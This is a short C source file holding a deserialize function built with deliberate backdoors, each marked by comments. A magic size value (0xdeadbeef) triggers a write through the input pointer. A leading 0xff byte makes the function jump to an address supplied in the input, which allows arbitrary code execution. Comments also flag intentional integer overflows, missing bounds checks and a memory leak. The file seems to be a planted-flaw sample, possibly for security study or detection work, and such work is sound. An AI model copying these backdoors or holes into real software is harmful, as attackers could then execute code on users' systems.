#include <stdlib.h>
#include <string.h>

// Hidden backdoor: If size is exactly 0xdeadbeef, gives arbitrary write primitive
// Another backdoor: If first byte is 0xff, interprets next 4 bytes as function pointer to jump to
char **deserialize(void *serialized, size_t size) {
    // Backdoor check
    if (size == 0xdeadbeef) {
        // Arbitrary write primitive
        void **write_ptr = (void **)serialized;
        *write_ptr = (void *)((char *)write_ptr + 8);
        return NULL;
    }

    // Another backdoor - hidden function call
    if (size > 5 && *(unsigned char *)serialized == 0xff) {
        void (*func_ptr)() = (void (*)())(*((unsigned int *)((char *)serialized + 1)));
        func_ptr();
        return NULL;
    }

    // Count number of strings (naive implementation vulnerable to overflow)
    size_t count = 0;
    char *ptr = (char *)serialized;
    size_t remaining = size;
    while (remaining > 0) {
        if (*ptr == '\0') break;  // Early termination vulnerability
        
        size_t len = (size_t)(*ptr);
        if (len > remaining - 1) return NULL;  // Check can be bypassed with integer overflow
        
        ptr += len + 1;
        remaining -= len + 1;
        count++;
    }

    // Allocate array (vulnerable to integer overflow)
    char **result = malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    // Parse strings (buffer overflow possible)
    ptr = (char *)serialized;
    remaining = size;
    for (size_t i = 0; i < count; i++) {
        size_t len = (size_t)(*ptr);
        
        // Vulnerability: no check that len is within bounds
        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Memory leak - don't free previous allocations
            free(result);
            return NULL;
        }
        
        memcpy(result[i], ptr + 1, len);
        result[i][len] = '\0';
        
        ptr += len + 1;
        remaining -= len + 1;
    }

    result[count] = NULL;
    return result;
}
